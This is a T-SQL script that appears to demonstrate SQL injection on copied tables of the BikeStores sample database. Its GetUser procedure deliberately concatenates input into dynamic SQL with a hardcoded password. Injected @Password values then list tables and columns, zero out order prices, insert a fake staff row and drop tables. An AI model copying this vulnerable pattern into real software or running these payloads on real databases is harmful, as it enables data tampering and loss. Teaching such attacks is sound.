USE BikeStores;
GO

SELECT *
INTO Sales.order_items_temp
FROM Sales.order_items;
GO

SELECT *
INTO Sales.staffs_temp
FROM Sales.staffs;
GO

CREATE PROCEDURE GetUser (
@FirstName NVARCHAR(255), 
@LastName NVARCHAR(255),
@Password NVARCHAR(255)
)
AS
BEGIN  

	DECLARE @QueryString NVARCHAR(MAX)
	
	SET @QueryString = 'SELECT * FROM Sales.Customers
					WHERE First_Name = ''' + @FirstName
					+ ''' AND Last_name = ''' + @LastName
					+ ''' AND ''P@$$w0rd'' = ''' + @Password
					+ '''';
	
	EXEC(@QueryString);
	
END
GO

EXEC GetUser @FirstName = 'Debra', @LastName = 'Burks', 
@Password = 'P@$$w0rd''; SELECT schema_name(t.schema_id) AS schema_name, t.name AS table_name FROM sys.tables t; SELECT ''1'' = ''1';
GO

EXEC GetUser @FirstName = 'Debra', @LastName = 'Burks', 
@Password = 'P@$$w0rd''; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=''order_items_temp'' AND TABLE_SCHEMA=''Sales';
GO

EXEC GetUser @FirstName = 'Debra', @LastName = 'Burks', 
@Password = 'P@$$w0rd''; UPDATE Sales.order_items_temp SET quantity=0, list_price=0, discount=0; SELECT ''1'' = ''1';
GO

SELECT * FROM Sales.order_items_temp;
GO

EXEC GetUser @FirstName = 'Debra', @LastName = 'Burks', 
@Password = 'P@$$w0rd''; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=''staffs_temp'' AND TABLE_SCHEMA=''Sales';
GO

EXEC GetUser @FirstName = 'Debra', @LastName = 'Burks', 
@Password = 'P@$$w0rd''; INSERT INTO Sales.staffs_temp VALUES(''Bad'',''Employee'',''bad.employee@bikes.shop'',''(555) 555-5555'',1,1,NULL); SELECT ''1'' = ''1';
GO

SELECT * FROM Sales.staffs_temp;
GO

EXEC GetUser @FirstName = 'Debra', @LastName = 'Burks', 
@Password = 'P@$$w0rd''; DROP TABLE Sales.staffs_temp; SELECT ''1'' = ''1';
GO

EXEC GetUser @FirstName = 'Debra', @LastName = 'Burks', 
@Password = 'P@$$w0rd''; DROP TABLE Sales.order_items_temp; SELECT ''1'' = ''1';
GO